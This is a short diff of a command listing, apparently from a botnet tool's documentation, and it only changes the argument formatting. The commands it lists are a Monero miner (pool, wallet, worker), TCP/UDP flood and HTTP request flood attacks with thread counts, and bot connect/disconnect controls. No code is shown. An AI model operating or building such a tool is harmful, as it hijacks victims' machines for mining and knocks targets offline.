@@ -6,10 +6,10 @@
 * help
 * bots
 * clear
-* miner <pool:port> <monero_wallet> <worker_name>
+* miner pool:port monero_wallet worker_name
 * methods
-* tcp <ip> <port> <threads>
-* udp <ip> <threads>
-* request <http(s)://example.com> <threads>
+* tcp ip port threads
+* udp ip threads
+* request http(s)://example.com threads
 * connect
 * disconnect
